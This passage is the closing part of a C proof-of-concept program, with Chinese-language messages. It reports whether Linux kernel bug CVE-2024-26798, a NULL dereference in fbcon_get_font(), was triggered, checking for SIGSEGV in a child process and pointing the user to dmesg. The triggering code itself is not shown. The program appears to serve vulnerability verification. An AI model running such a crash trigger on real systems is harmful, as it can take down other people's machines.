            "║  [VULN CONFIRMED] CVE-2024-26798 已觸發！                ║\n"
            "║                                                          ║\n"
            "║  child 收到 SIGSEGV = kernel oops 在 fbcon_get_font()   ║\n"
            "║  解參考 NULL vc_font.data 時發生。                       ║\n"
            "║                                                          ║\n"
            "║  請執行 dmesg | tail -60 確認 kernel oops call trace。   ║\n"
            "╚══════════════════════════════════════════════════════════╝\n");
    } else if (get_result == 0) {
        fprintf(stderr,
            "[?] child 正常退出（GET 成功）。\n"
            "    kernel 可能已套用修補，\n"
            "    或 vc_font.data 並未真正為 NULL。\n"
            "    請執行 dmesg 確認是否有 oops。\n");
    } else {
        if (!get_done) {
            fprintf(stderr, "[?] child 結束狀態異常：");
            if (WIFSIGNALED(status))
                fprintf(stderr, "signal %d (%s)\n", WTERMSIG(status),
                        strsignal(WTERMSIG(status)));
            else
                fprintf(stderr, "exit code %d\n", WEXITSTATUS(status));
        }
        fprintf(stderr, "    請執行 dmesg 確認是否有 kernel oops。\n");
    }

    return 0;
}
